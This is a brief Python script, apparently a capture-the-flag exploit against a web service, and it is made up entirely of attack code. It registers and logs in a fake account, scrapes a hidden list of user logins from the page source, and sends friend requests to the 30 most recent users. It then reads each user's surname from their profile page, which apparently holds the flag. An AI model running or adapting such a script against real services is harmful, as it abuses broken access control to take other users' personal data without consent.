#!/usr/bin/env python3
from faker import Faker
import requests
import re
import sys

fake = Faker()
HOST = f"{sys.argv[1]}:5000"
s = requests.Session()

user_data = {
    "login": fake.user_name(),
    "password": fake.password(),
    "name": fake.first_name(),
    "surname": fake.last_name()
}

s.post(f"http://{HOST}/register", data=user_data)
s.post(f"http://{HOST}/login", data={"login": user_data["login"], "password": user_data["password"]})

users = re.search(r'<div style="display:none">(.*?)</div>', s.get(f"http://{HOST}/users").text).group(1).split(',')
#print(users)

for user in users[-30:]:
    s.post(f"http://{HOST}/send_friend_request", data={"friend_login": user})
    surname = re.search(r'<h2>.*? (.*?)</h2>', s.get(f"http://{HOST}/profile/{user}").text).group(1)
    print(f"{surname}", flush=True)